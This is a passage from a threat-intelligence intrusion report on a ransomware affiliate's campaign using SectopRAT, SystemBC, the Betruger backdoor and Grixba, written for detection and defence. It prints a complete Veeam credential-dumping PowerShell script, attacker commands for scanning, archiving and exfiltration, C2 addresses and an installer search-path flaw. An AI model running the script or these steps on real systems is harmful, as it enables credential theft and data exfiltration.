reconnaissance tool linked to Play ransomware), a previous NetScan output containing data from a company reportedly compromised by DragonForce ransomware, and the use of the Betruger backdoor suggest that the likely objective of this intrusion was ransomware deployment. Based on these findings, the threat actor behind this intrusion was most likely an affiliate operating across multiple ransomware groups. This case was originally published as a Threat Brief to customers in March of 2025. Interested in pricing or have questions about our services? Contact us The DFIR Report Services Private Threat Briefs : 20+ private DFIR reports annually. Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc. All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel. Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples. DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds. Contact us today for pricing or a demo! Table of Contents: Case Summary Analysts Initial Access Execution Persistence Privilege Escalation Defense Evasion Credential Access Discovery Lateral Movement Collection Command and Control Exfiltration Impact Timeline Diamond Model Indicators Detections MITRE ATT&CK Case Summary The intrusion began in September 2024 with a download of a malicious file mimicking the EarthTime application by DeskSoft. Upon execution, SectopRAT was deployed which opened a connection to its command and control (C2) infrastructure. The threat actor established persistence by relocating the malicious file and placing a shortcut in the Startup folder, configured to trigger on user logon. They further elevated access by creating a new local account and assigning it local administrative privileges. Soon after establishing the initial access, the malware deployed SystemBC. They then accessed the beachhead host via RDP using the newly created local account and executed discovery commands. At this stage, the threat actor completed a DCSync attack against a domain controller. They then followed up by connecting to the domain controller over RDP with the built-in Administrator account and used PsExec to execute SystemBC with SYSTEM privileges on the host. Using their existing proxy tunnel, the threat actor once again used RDP to connect to hosts in the environment. While on the domain controller, we observed the threat actor using Windows utilities, such as ipconfig and nltest, to perform an enumeration. Over the next few hours, the threat actor connected to several servers using RDP and deployed SystemBC across the environment. On a backup server, they executed a PowerShell script designed to retrieve Veeam credentials. On the second day, the threat actor used RDP to move laterally to the file server where they dropped a WinRAR executable and archived specific file shares. They transferred the resulting archives to a U.S. based cloud host over unencrypted FTP using WinSCP. This enabled the retrieval of credentials, among other details, during traffic analysis. The threat actor also resumed discovery activity with the use of Grixba, a tool associated with Play Ransomware that uses WMI and WinRM to discover users and systems across the network, which was executed from both the domain controller and a backup server. They carried out further discovery activity with the use of AdFind for AD queries, PowerShell Cmdlets to collect host data, SharpHound for directory mapping, and SoftPerfect NetScan to scan remote hosts. On the sixth day of the intrusion, SectopRAT spawned a new payload on the beachhead host. The new payload executed was Betruger, a multi-function backdoor. The threat actor also used wmiexec to enumerate remote hosts through various reconnaissance commands executed on the domain controller. Throughout the intrusion, the threat actor used multiple defense evasion techniques, including process injection, timestomping, disabling Microsoft Defender\u2019s protections, and deploying binaries with spoofed metadata to disguise themselves as legitimate cybersecurity tools such as SentinelOne and Avast Antivirus. While no final actions were observed during this intrusion before the threat actor was evicted, the evidence shows links to three different ransomware operations. The Grixba tooling has been associated with the Play ransomware group. Similarly the Betruger backdoor has been linked to Ransomhub affiliated threat actors. And finally with opsec failures, the threat actor dropped the results of prior netscan discovery that appeared to contain data from a company that had been posted to the DragonForce Ransomware leak site prior in 2024. With each of these indicators we assess this threat actor was active as an affiliate for multiple ransomware groups. Analysts Analysis and reporting completed by r3nzsec , EncapsulateJ , rkonicekr , and Adam Rowe . Initial Access The intrusion began when a user downloaded and executed an executable impersonating DeskSoft\u2019s EarthTime application. This binary initiated a chain of execution leading to the deployment of SecTopRat, a .NET-based remote access trojan (RAT) with information-stealing capabilities. While investigating the connection between this malware and the legitimate software, we identified a vulnerability in the installer. Although we did not observe the threat actor exploiting this flaw, it may explain why the software was targeted. The EarthTime application has a list of resource files that it will copy into its install location. This includes the EarthTime.exe executable file. When the installer is run, before it unpacks the resources from inside the installer package, It first looks for these resources in the current directory: Meaning that if any of the files listed in the resource are found, it will copy that file instead of the one packaged in the installer. For example, we created our own Cities.txt file, and on installation, we confirmed our modified file was copied to the installed location: This behavior matches CWE-427 \u2013 Uncontrolled Search Path Element ( https://cwe.mitre.org/data/definitions/427.html ) We discovered that this vulnerability applies to all software provided by Desksoft. Execution EarthTime.exe The EarthTime.exe binary was executed from the Downloads folder. The parent process was explorer.exe, suggesting it was executed by the victim clicking on the executable. EarthTime.exe appeared to be mimicking the legitimate EarthTime application by DeskSoft. The real EarthTime is a world clock utility that lets users track multiple time zones and view astronomical data like sunrise and sunset times for different locations. It\u2019s particularly useful for business users and travelers who need to coordinate across time zones. This malicious version had been signed with a revoked certificate from \u201cBrave Pragmatic Network Technology Co., Ltd.\u201d \u2013 likely an attempt to make it look legitimate to both users and security software. Brave Pragmatic Network Technology Co., Ltd. appears to be a compromised or fraudulent certificate authority that has been observed signing multiple malware samples, with security researchers tracking various malicious executables bearing certificates from this entity. According to Cert Central lookup database , Brave Pragmatic Network Technology Co., Ltd. is a known malicious signer that has been observed signing SectopRAT samples, with certificates issued by GlobalSign GCC R45 EV CodeSigning CA 2020 and traced to China (CN). The choice to impersonate EarthTime makes sense from the threat actor\u2019s perspective, as people are generally more willing to run software they recognize. A file named \u201cEarthTime.exe\u201d is far less suspicious than something with a random or obviously malicious name, making this a classic example of social engineering through software masquerading. At the time of writing, the binary is widely recognized as malicious : EarthTime.exe spawned cmd.exe with no command line arguments. This cmd.exe process went on to spawn MSBuild.exe with the CurrentDirectory set to the user\u2019s downloads folder. MSBuild.exe is a legitimate binary signed by Microsoft, but it is unusual for it to be executed with no command-line arguments. Red Canary has previously observed this activity linked to the SecTopRAT/ArechClient2, a .NET RAT tool, which also inspired the following threat hunting query , which would detect this activity. Process chains where SecTopRat/ArechClient2 has been injected into both cmd.exe and a subsequent msbuild.exe child process have been commonly observed, such as by Red Canary and The DFIR Report . After injection, the malicious MSBuild.exe process reached out to Pastebin to retrieve its C2 configuration. MSBuild.exe communicated with 45.141.87.55 on ports 9000 and 15647. This traffic triggered the following Suricata rules: This SectopRAT IP address was also mentioned by Fox_threatintel on X/Twitter last year (2024) while also mentioning port 9000 The same IP address was listed in the IOC section of RussianPanda\u2019s blog detailing The abuse of ITarian RMM by the Dolphin Loader, a malware delivery mechanism that leverages legitimate remote management tools to deploy RATs like SectopRAT. This MSBuild.exe process then wrote the malicious executable C:\\Users\\Public\\Music\\WakeWordEngine.dll . This file write event triggered the following Sigma rules: \u2022 \u2018Suspicious Binaries and Scripts in Public Folder\u2019 \u2022 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 WakeWordEngine.dll | conhost.dll WakeWordEngine.dll is widely recognized as malicious at the time of writing. VirusTotal recognizes the file as conhost.dll : In-memory YARA scans identified the DLL as SystemBC, triggering the following signatures: Rule: ELASTIC_Windows_Trojan_Systembc_C1B58C2F Rule: EXT_MAL_SystemBC_Mar22_1 Rule: MALPEDIA_Win_Systembc_Auto Rule: TELEKOM_SECURITY_Win_Systembc_20220311 This DLL was deployed across multiple compromised servers throughout the intrusion. In most instances, it retained the same filename observed on the initial beachhead system (WakeWordEngine.dll); however, on the domain controller it was renamed to conhost.dll which corresponds to the filename identified in VirusTotal analysis. Across all infected systems, the malware was consistently staged in the C:\\Users\\Public\\Music\\ directory and executed via rundll32.exe, calling the exported function \u2018Reset\u2019. For instance, we also observe the threat actor executing the malicious DLL remotely via PsExec. WakeWordEngine.dll/conhost.dll processes were observed communicating with 149.28.101.219 over port 443. OSINT data identifies this IP address as associated with SystemBC infrastructure and shows it resolves to the following domains: Memory analysis found that once loaded in memory, the strings within the DLL show multiple items of interest, including the configured C2 IP and port, a user-agent, as well as references to PowerShell and ntdll.dll\u2019s LdrLoadDll function, which can be used for DLL loading: The full initial access and execution chain is captured below: ccs.exe On day six, MSBuild.exe wrote C:\\Users\\Public\\Music\\ccs.exe to disk. The ccs.exe binary was subsequently executed with MSBuild.exe as the parent process. Exiftool analysis revealed that the binary contained the following metadata, designed to impersonate Avast Antivirus: At the time of writing, ccs.exe is widely recognized as malicious in VirusTotal and was identified as Betruger backdoor by Symantec, a tool commonly used by RansomHub affiliates. According to Symantec\u2019s analysis , the Betruger backdoor incorporates functionality typically found across multiple pre-ransomware tools, consolidating various attack capabilities into a single executable. Betruger\u2019s comprehensive feature set includes screenshotting, keylogging, file exfiltration, network reconnaissance, privilege escalation, and credential harvesting. This extensive functionality suggests that Betruger was explicitly developed to streamline ransomware operations by reducing the number of distinct tools that need to be deployed on a compromised network during the preparation phase of an attack. Once executed, ccs.exe then injected itself into the memory of 172 distinct running processes. The call trace logged in Sysmon Process Access events shows ccs.exe injecting itself into these processes\u2019 memory: vhd.dll Lastly, we also observed another execution of a suspicious DLL (vhd.dll) dropped on the disk in the same staging folder of the threat actor. The threat actor used this PowerShell command to set the working directory to C:\\Users\\Public\\Music , a publicly writable folder where they had staged their malicious payloads. This allowed them to later execute VHD.dll via rundll32.exe without specifying a full path, simplifying execution and reducing the visibility of suspicious file paths in command-line logs. Upon execution, the vhd.dll would ask for a key, which is needed in order to fully execute the program. While checking the codes, we observed vhd.dll is a loader that asks for a key to decrypt a local file ( data.dat ) containing a hidden payload. Once decrypted, it executes the payload to ensure it only runs if the correct key is provided. Unfortunately, we were unable to fully attribute or deeply analyze the .DAT file to determine its specific purpose or associated malware family. Persistence Following the execution of the malicious binary EarthTime.exe, the threat actor leveraged the Windows Background Intelligent Transfer Service (BITS) to establish persistence through two coordinated activities. The first transfer involved copying the original executable to a new location at C:\\Users\\<REDACTED>\\AppData\\Roaming\\QuickAgent2\\ and renaming it to ChromeAlt_dbg.exe , likely to masquerade as a legitimate Chrome debugging utility. The second transfer created a shortcut file ChromeAlt_dbg.lnk and placed it in the C:\\Users\\<REDACTED>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ directory. Through the creation of this startup entry, the threat actor successfully established a persistence mechanism with ChromeAlt_dbg.lnk setup to execute the renamed Earthtime.exe file, ChromeAlt_dbg.exe . During the intrusion, the threat actor created a local account named \u201cAdmon\u201d with the password \u201cQwerty12345!\u201d using the legitimate binary net.exe on the beachhead host. Privilege Escalation The threat actor created a new local user account called \u201c Admon \u201d with the password \u201c Qwerty12345 !\u201d on the compromised system. They then added this newly created account to the local Administrators group, giving themselves full administrative privileges on the machine. The threat actors leveraged Microsoft Sysinternals\u2019 PsExec utility for local privilege escalation on the compromised host. By utilizing the \u201c-s\u201d parameter, the adversaries were able to execute malicious binaries with SYSTEM-level privileges, effectively escalating from their initial user-level access to the highest administrative privileges on the Windows system. Defense Evasion During the initial access malware execution a SectopRAT binary was written to %AppData%\\Local\\Temp as bhnwcwgaphpge. This was then injected into the MSBuild.exe process to run the malware. Two of the binaries observed in this attack were masquerading as products from well-known and reputable security vendors. The first binary, GT_NET.exe is associated with Grixba, a custom data-gathering tool used by the Play ransomware group. Its metadata was crafted to impersonate SentinelOne security software, complete with fake product names, descriptions, and copyright information referencing \u201cSentinel Labs, Inc.\u201d The team from Field Effect also noticed this, as per their blog back in January of this year. The second binary, ccs.exe contains the Betruger backdoor commonly deployed by RansomHub affiliates. This malware was designed with extensive metadata mimicking Avast Antivirus, including legitimate-appearing product names, version numbers, and copyright information. The threat actors even used a filename convention (\u201caswAvBootTimeScanShMin.exe\u201d) that closely resembles authentic Avast components. We also observed the threat actor attempting to disable Windows Defender\u2019s security features by modifying critical registry keys on the domain controller and backup server. Examining the registry events reveals a step-by-step approach to disable multiple Windows Defender registry keys, including real-time scanning, behavior monitoring, anti-spyware detection, and network protection. These registry changes focused on the Windows Defender policy area ( HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\ ), showing the threat actor wanted to make system-wide security changes that would last through reboots and affect all users. By targeting the policy registry instead of user-specific settings, the threat actor made sure they had maximum impact while keeping their changes in place during their attack. Lastly, the theater actor performed potentially time-stomping activities by manipulating the metadata of the ExportData.db file, which contained the scan results, by executing the \u201cGT_NET.exe\u201d binary. This timestomping occurred immediately after GT_NET.exe created the ExportData.db file, which suggests the threat actor attempts to cover its tracks by automatically changing the timestamps of its created files. The choice of a future date (2037) is particularly telling \u2013 it\u2019s far enough from the actual attack time frame to potentially throw off forensic analysis that relies on file timestamps to understand the sequence of events. Below is the sequence of events by looking at Sysmon Event ID 2. Credential Access The threat actor employed various methods to access credentials throughout this intrusion, including information stealers, Veeam database credential dumping, DCSync attacks, and the deployment of Betruger backdoor malware. Information Stealers YARA scans on memory dumps from the beachhead returned various hits for Arechclient malware (aka SectopRAT) with the following signature: Windows.Trojan.Arechclient2 SectopRAT is widely known to have information-stealing capabilities, which are on display in the strings from this particular dump. The strings reference scans for various services, including Steam, Discord, Telegram, web browsers, and crypto wallets, which is textbook infostealer activity. Veeam Database Credential Dumping Windows Event ID 4104 from the Microsoft-Windows-PowerShell/Operational log is generated by PowerShell\u2019s script block logging feature, which records the execution of PowerShell scripts. This artifact revealed that the threat actor executed a script on the backup server to extract credentials from a Veeam database. The script contains multiple sections, which have been broken down into smaller parts for better readability. The first section queries the Windows Registry for SQL Server instances and targets a hardcoded database named \u201cVeeamBackup\u201d. The $SQLQuery variable was configured to retrieve the top 1000 rows from the Credentials table within the VeeamBackup database: \"# SQL Server and database\\\\\" $hostname = hostname \"$SQLInstances = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL Server').InstalledInstances\" \"$SQLServer = \\\"$hostname\\\\$SQLInstances\\\" #use Server\\\\Instance for named SQL instances! \" \"$SQLDBName = \\\"VeeamBackup\\\"\" \"# SQL Query\" \"$SqlQuery = \\\"SELECT TOPdatabase (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials]\\\"\" The next section of the script establishes a connection to the SQL Server database, executes the query stored in the $SQLQuery variable, stores the results in a dataset, and then closes the connection: \"# Connection string \" $SqlConnection = New-Object System.Data.SqlClient.SqlConnection \"$SqlConnection.ConnectionString = \\\"Server = $SQLServer; Database = $SQLDBName; Integrated Security = True\\\" $SqlCmd = New-Object System.Data.SqlClient.SqlCommand $SqlCmd.CommandText = $SqlQuery $SqlCmd.Connection = $SqlConnection $SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter $SqlAdapter.SelectCommand = $SqlCmd $Result= New-Object System.Data.DataSet $SqlAdapter.Fill($Result) \"#Close the connection \" $SqlConnection.Close() The next section of the script was used to convert DataTable rows to PowerShell objects: $MyArray = ForEach ($Row in $Result.Tables[0].Rows) { $Record = New-Object PSObject ForEach ($Col in $Result.Tables[0].Columns.ColumnName) { Add-Member -InputObject $Record -NotePropertyName $Col -NotePropertyValue $Row.$Col } $Record } The final section of the script contains a for loop that performs the following actions: Iterates through each item in the $MyArray variable Loads the DLL Veeam.Backup.Common.dll (required to access the class needed for password decryption) Uses Veeam\u2019s ProtectedStorage class to decrypt the encoded passwords Displays usernames, decrypted passwords, and descriptions to the console for ($i = 0; $i -lt $MyArray.Length; $i++) { Add-Type -Path \"C:\\Program Files\\Veeam\\Backup and Replication\\Backup Catalog\\Veeam.Backup.Common.dll\" $encoded = $MyArray.password[$i] $pass = [Veeam.Backup.Common.ProtectedStorage]::GetLocalString($encoded) Write-Host \"==================\" Write-Host \"user_name: \" $MyArray.user_name[$i] Write-Host \"password: \" $pass Write-Host \"description:\" $MyArray.description[$i] Write-Host \"==================\" DCSync Credentials were also dumped via a DCSync attack using a privileged account. The activity was observed in Windows Security Event ID 4662, with clear indicators including a non-computer-based account, an access mask of 0x100, and the following object ID: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} = DS-Replication-Get-Changes Betruger Backdoor As outlined in the Command and Control section of this report, the file hash for the executable C:\\Users\\Public\\Music\\ccs.exe returned a direct match for the Betruger backdoor. According to research conducted by the Symantec team, this backdoor is multifunctional and includes modules designed for credential dumping. The backdoor accessed the LSASS process memory to harvest credentials, which was observed through a Sysmon process access event showing a GrantedAccess value of 0x1410 . Discovery Local system discovery The initial execution of MSBuild.exe on the beachhead led to the discovery of commands such as ipconfig , nslookup and net localgroup . Below is the illustration of the execution chain involving multiple Windows built-in commands abused by the threat actor. On day six of the intrusion, additional discovery and reconnaissance commands were executed on the compromised beachhead host. These commands were spawned as child processes of the Betruger ccs.exe process and included whoami for identity verification, net user and net group for local and domain user enumeration, nltest for domain trust relationship analysis, and ping for network connectivity testing. The cmd.exe process spawned by Betruger also wrote several suspicious hidden files indicative of discovery in the user\u2019s Downloads directory, which was also the CurrentDirectory: Network Scanning During the intrusion, the threat actor two versions of the Grixba tool. Grixba is a custom tool reportedly used by Play Ransomware that scans computer networks to find users, computers, and installed software using built-in Windows tools like WMI and WinRM. It specifically looks for security programs, antivirus software, backup tools, and office applications for reconnaissance purposes. An analysis of a Grixba sample revealed the following help message and functionality: During day two of the intrusion, the threat actor deployed the Grixba reconnaissance tool ( GT_NET.exe ) on the compromised backup server. The malware was executed through a cmd.exe parent process using the command line. GT_NET.exe -m:scan -i:f -d:list.txt Here\u2019s the command line options breakdown: -m:scan - Sets the mode/method to scan. -i:f - Input parameters set to \"f\" (file) -d:list.txt - Destination parameter pointing to list.txt. Can be used to load target IPs. GT_NET.exe generated 3,861 internal DNS queries and established 186 network connections during its execution. The majority of connections targeted destination port 135 (Microsoft RPC), with additional connections to port 389 (LDAP) and various high-numbered ephemeral ports ranging from 49666 to 63964. The creation of data.zip and ExportData.db files align with behavioral indicators documented by Field Effect\u2019s research on Grixba malware in their published analysis. Another network scanning tool used was the SoftPerfect tool netscan.exe, which was executed on the domain controller from the path C:\\Users\\Public\\Music\\123\\123\\netscan.exe and scanned ports 135 (RPC), 445 (SMB) and 3389 (RDP) across 46 IP addresses. During the netscan execution on the domain controller, we observed the creation of a file called delete.me on the C$ share of the beachhead workstation, logged by Event ID 5145. This activity has been previously observed related to netscan.exe when the \u2018Check for write access\u2019 option is enabled, as detailed in previous reports: https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware and https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours Prior to the execution of netscan.exe, we also observed the threat actors creating netscan.xml in the same directory as the executable. This file was retrieved for analysis, and inspecting its contents shows the checkwrite flag was indeed enabled: Digging into the netscan.xml config file, it\u2019s clear that the threat actors tweaked it to suit their needs, with a big focus on using PsExec to run scripts remotely. This setup enables them to deploy batch files, such as newuser.bat, openrdp.bat, and start.bat across the network. This opens the door to tasks like setting up new user accounts, enabling RDP access, and deploying additional malicious payloads. While examining the files associated with NetScan, we observed one output file with a filename matching the name of a company, potentially indicating a victim of this threat actor. Based on OSINT data, this organization has been compromised by DragonForce, as evidenced by their company profile being posted on DragonForce\u2019s data leak site (DLS). The third and final tool used for network scanning was GRB_NET.exe (another version of Grixba). This was executed on the domain controller from two different paths using different command line arguments: Upon execution, GRB_NET.exe initiated extensive network reconnaissance by generating 1,373 DNS A record queries to enumerate internal domain hosts and establishing 145 network connections. These connections primarily targeted port 135 (Microsoft RPC) and port 389 (LDAP) for service enumeration, along with ephemeral ports in the range 49666-51508. Following the reconnaissance phase, the malware created an archive file C:\\Users\\Public\\Music\\export.zip likely containing the collected data. GRB_NET.exe is unsigned and recognized as malicious by 10 vendors in VirusTotal. Active Directory Discovery On day two of the intrusion, the threat actors executed SharpHound (disguised as sh.exe ) on the domain controller from the directory C:\\PerfLogs\\ . This Active Directory reconnaissance tool was launched with the command line parameters shown below. Binary analysis confirmed the executable\u2019s metadata identifies it as a renamed SharpHound binary, which also indicates evasion tactics. When executed, sh.exe made 1,271 internal DNS A requests, as well as the following network connections, all of which triggered the Sigma rule \u2018Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location\u2019: sh.exe also wrote the following files, indicative of BloodHound/SharpHound execution. The writing of these files triggered the following Sigma rules: \u2018BloodHound Collection Files\u2019 \u2018Suspicious File Created in PerfLogs\u2019 \u2018Windows Shell/Scripting Application File Write to Suspicious Folder\u2019 The threat actor conducted additional Active Directory reconnaissance using the ADFind enumeration tool ( Adfind.exe ), which was staged in the C:\\Users\\Public\\Music\\ directory. The threat actor executed the command with the \u201c-subnets\u201d parameter to query the CN=Subnets,CN=Sites,CN=Configuration partition, where Active Directory stores subnet-to-site mappings and network topology information. PowerShell Script Block logging from the Domain Controller (event code 4104) shows the following Get-ADComputer command was imported and then executed to enumerate Active Directory computer objects and output them to a CSV file: Import-Module ActiveDirectory; Get-ADComputer -Filter {enabled -eq $true} -properties *|select comment, description, Name, DNSHostName, OperatingSystem, LastLogonDate, ipv4address | Export-CSV C:\\Users\\Public\\Music\\AllWindows.csv -NoTypeInformation -Encoding UTF8 Other discovery commands executed on the Domain Controller and observed in the PowerShell Script Block logging include: nltest /domain_trusts /all_trusts nltest /dclist: net group \"Domain Admins\" /domain File Discovery Prior to the archiving stage, we observed the threat actor accessing the contents of multiple files using wordpad.exe , primarily on the file server as part of their discovery phase. On two occasions, the threat actor pivoted to the backup server to view and access files on the shared drives. This demonstrates the lateral movement capabilities and network discovery, which indicates the threat actor had gained extensive knowledge of the organization\u2019s infrastructure and understood how to navigate between systems to access sensitive data efficiently. One notable document sought out and opened by the threat actor was an insurance policy document covering cyber intrusions. Where zipped files were found, these were opened using WinRAR: \"C:\\Program Files\\WinRAR\\WinRAR.exe\" x -iext -ow -ver -imon1 \u2013 \"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip\" F:\\Shares\\<redacted>\\<redacted>\\<redacted>\\ Lateral Movement The Remote Desktop Protocol (RDP) and Impacket\u2019s wmiexec were used throughout this intrusion to facilitate lateral movement. Remote Desktop Protocol The adversary primarily relied on Remote Desktop Protocol (RDP) for lateral movement throughout the compromised network. Analysis of Windows security logs revealed a consistent pattern where logon type 3 (network) events were immediately followed by logon type 10 (remote interactive) events, which is characteristic of RDP authentication sequences. This specific logon pattern was likely facilitated by SystemBC malware\u2019s proxy capabilities, which enabled the threat actor to establish RDP connections through compromised systems. Notably, the Windows security event logs disclosed the host names of the threat actor\u2019s workstations: (note the apparent typo in \u201cDESCTOP\u201d in one instance). DESCTOP-QPITRY DESKTOP-A1HRTMJ DESKTOP-PGD76HT WIN-FLGU1CC210K Impacket On day six, the threat actor used wmiexec from the Impacket suite to remotely execute various enumeration commands on the domain controller. The parent-child relationship between WmiPrvSE.exe and cmd.exe, combined with the characteristic output redirection to administrative shares, provides a clear signature of wmiexec usage. The commands executed behave as typical post-exploitation reconnaissance activities, with particular focus on enumerating specific user accounts and understanding the current user session. Betruger After the deployment of the Betruger backdoor on day six, multiple Windows Event IDs 4776 (credential validation) were observed, indicating successful network authentication attempts against the beachhead system. The source workstation associated with these authentication events WIN-FLGU1CC210K had not been observed in any previous activity during this intrusion. Based on the timing correlation with Betruger deployment and the sudden appearance of this previously unseen hostname, we assess with high confidence that this represents an additional workstation under threat actor control. Collection WinRAR.exe was brought into the victim environment for collection purposes. On day two, during a period of the threat actor\u2019s activity and under a compromised user context, explorer.exe created C:\\Users\\Public\\Music\\winrar-x64-611.exe . This binary was then executed and wrote the file C:\\Program Files\\WinRAR\\WinRAR.exe to disk. The threat actor then used WinRAR.exe to zip victim files on the file share prior to exfiltration. They systematically archived six high-value directories, before performing additional archiving operations on specific files, e.g. \"C:\\Program Files\\WinRAR\\WinRAR.exe\" a -ep1 -scul -r0 -iext -imon1 -- . F:\\Shares\\REDACTED\\REDACTED The threat actor also deployed a tool named FS64.exe , a custom tool designed for automating file collection. During execution, the threat actor specifies the drive or directory from which to collect files, and the tool outputs a .txt file containing the list of collected files. It was executed on the backup server, targeting a remotely mounted share on the file server. The process wrote the file __<redacted_fileserver_ip>_F$_Shares.txt as well as copying multiple .xls, .xlsx, .doc., .docx, .pdf files to the C:\\Users\\Public\\Music\\ directory. Winrar.exe was also used to extract WinSCP.rar in preparation for exfiltration. We also discovered a WinSCP.ini configuration file used by the WinSCP application. The threat actor utilized WinSCP to perform data exfiltration, as detailed in the Exfiltration section of this report. This WinSCP configuration reveals that the threat actor configured a custom file mask targeting a wide range of file types, including web content ( .html , .php , .js , .css ), configuration files ( .cfg , .ini , .htaccess ), and scripts/source code ( .sh , .pl , .c , .cpp ). This selective file mask indicates an intent to specifically identify and exfiltrate files containing website content, credentials, or source code rather than indiscriminately copying all available files. Command and Control Three separate Command and Control channels were observed: SectopRAT, SystemBC, and Betruger. SectopRAT The following Surricata rules triggered on the network traffic, once SectopRAT injected itself into the MSBuild.exe process for IP address 45.141.87[.]55. This IP was tracked by the DFIR Report Threat Intelligence Group as an active SectopRAT C2 server from August 8th 2024 through November 23rd 2024. The rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init \u201d fired when network traffic to the destination port 15647 was detected. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 15647 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe The second rule \u201c ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) (SID 2052248) \u201d fired when C2 beaconing activity to destination port 9000 was observed. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 TgtIP: 45.141.87[.]55 \u00a6 TgtPort: 9000 \u00a6 Proc: C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe SystemBC Shortly after the command-and-control (C2) channel was established via the SectopRAT malware, a new file named WakeWordEngine.dll (also observed later in the intrusion named conhost.dll) was created on the beachhead host. This file was identified as the SystemBC tool, which is commonly leveraged for its proxying and tunneling capabilities. The threat actor used SystemBC to establish a tunnel, enabling Remote Desktop Protocol (RDP) access via proxy connections. This allowed them to pivot into the internal network from external systems, facilitating further post-compromise activity within the environment. The following Sigma rule triggered once the tunnel was established \u201cOutbound RDP Connections Over Non-Standard Tools\u201d. Initiated: true \u00a6 Proto: tcp \u00a6 SrcIP: 10.X.X.X \u00a6 SrcPort: 62105 \u00a6 TgtIP: 10.65.45[.]223 \u00a6 TgtPort: 3389 \u00a6 Proc: C:\\Windows\\SysWOW64\\rundll32.exe The activity exposed the client names of the computers used by the threat actor. During the intrusion, the following client names were observed: DESKTOP-A1HRTMJ, DESKTOP-PGD76HT, DESCTOP-QPITRY (sic) and WIN-FLGU1CC210K Betruger On the fifth day of intrusion, we observed that the SectopRAT process created a new binary, ccs.exe. This particular binary has been identified as Betruger, a multi-function backdoor which appears to have been explicitly developed for carrying out ransomware attacks. This custom backdoor has been seen used by affiliates of RansomHub. Once executed, it will reach out to its command and control infrastructure, which was 504e1c95.host.njalla[.]net . Based on OSINT, the 504ec1c95.host.njalla[.]net has been classified as a phishing domain. Based on Symantec\u2019s analysis , the file was identified as the Betruger malware, a multi-functional backdoor. The malware established command and control (C2) communication over multiple IP addresses using ports 80 and 443. Exfiltration On day two of the intrusion, the threat actor began preparing for data exfiltration on the file server. The threat actor conducted systematic data archiving as part of their data staging phase before the main data exfiltration activities, as described in the Collection section of this report. Immediately after, the threat actors initiated outbound network traffic to the IP address 144.202.61.209 using WinsCP via File Transfer Protocol (FTP), efficiently exfiltrating the staged files for approximately 15 minutes. Due to the threat actor\u2019s use of the unencrypted FTP protocol rather than SFTP for data exfiltration, packet capture analysis from the file server revealed compromising evidence of the threat actor\u2019s activities in clear text, including their credentials. Based on the Wireshark capture below, the threat actor connected to an FTP server and began uploading the RAR files they created during data staging, starting with \u201cMDTM **** IT.part1.rar\u201d. The session shows them navigating directories using standard FTP commands (PWD, CWD) and switching between ASCII and binary transfer modes for optimal file transmission. The capture reveals systematic exfiltration of archived organizational data, including attempts to upload \u201cFinance.rar\u201d and other sensitive files they had previously compressed. Impact While no ransomware was deployed before the adversary was evicted from the environment, the threat actor ultimately achieved one of their primary objectives, successfully exfiltrating data from the network. Based on the actions performed by the adversary during this intrusion and the tactics, techniques, and procedures (TTPs) observed throughout the campaign, we assess with high confidence that this was an active ransomware affiliate likely working with various ransomware-as-a-service (RaaS) providers. Based on the analysis of these intrusion events, we identified multiple indicators linked to three distinct ransomware groups. The detailed attribution matrix is as follows. Observed TTPs Group Category Grixba (GT_Net.exe) Play Malware Binary Grixba (GRB_NET.exe) Play Malware Binary Payload staging under C:\\Users\\Public\\Music directory RansomHub Persistence/Staging Betruger Backdoor (ccs.exe) RansomHub Backdoor Usage of BitsAdmin RansomHub LOLBins REDACTED.xml (Netscan output file from another victim) DragonForce Discovery SystemBC (wakewordengine.dll | conhost.dll) Play + DragonForce C2/Proxy Mlaware Impacket (wmiexec) Play + RansomHub Lateral Movement / Credential AccessP NetScan, ADFind, WinRAR, WinSCP, PSExec Play + RansomHub + DragonForce Post-Exploitation Tools Timeline Diamond Model Indicators Atomic 45.141.87.55 - MSBuild.exe C2 (SectopRAT) 149.28.101.219 - WakeWordEngine.dll/conhost.dll (SystemBC) 504e1c95.host.njalla[.]net - ccs.exe (Betruger) 80.78.28.149 - ccs.exe (Betruger) 144.202.61.209 - TA's FTP server Computed earthtime.exe 71f703024c3d3bfc409f66bb61f971a0 f24fc14f39c160b54dc3b2fbd1eba605ec0eb04f bcff246f0739ed98f8aa615d256e7e00bc1cb24c8cabaea609b25c3f050c7805 wakewordengine.dll / conhost.dll e963d598a86c5ee428a2eefa34d1ffbb 142294249feb536e0edbe6e2de3eb3c3415ecf39 6f9326224e6047458e692cd27aeb1054b9381c67aaf2fe238dbebfbc916c4b33 ccs.exe (Betruger) 5675a7773f6d3224bfefdc01745f8411 c0e5e4b5fcbd0a30b042e602d99a6ee81ad5d8d7 ae7c31d4547dd293ba3fd3982b715c65d731ee07a9c1cc402234d8705c01dfca fs64.exe c6f92d1801d7d212282a6dd8f11b44fe d15d45d9d9a8ef7a9f048d74b386f620f3b82576 